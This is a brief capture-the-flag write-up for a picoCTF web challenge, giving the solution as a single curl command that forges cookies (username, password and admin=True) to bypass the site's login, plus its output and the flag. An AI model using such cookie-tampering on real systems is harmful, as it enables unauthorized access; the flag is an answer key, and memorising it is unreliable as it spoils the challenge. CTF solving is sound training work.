## Descripción:
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594

# Solución
```bash
MpaulaCG-picoctf@webshell:~$ curl -X GET https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: username=admin; password=admin; admin=True" | grep pico 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   7510      0 --:--:-- --:--:-- --:--:--  7540
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>
```
Respuesta:`picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}`
## Notas

## Referencias
 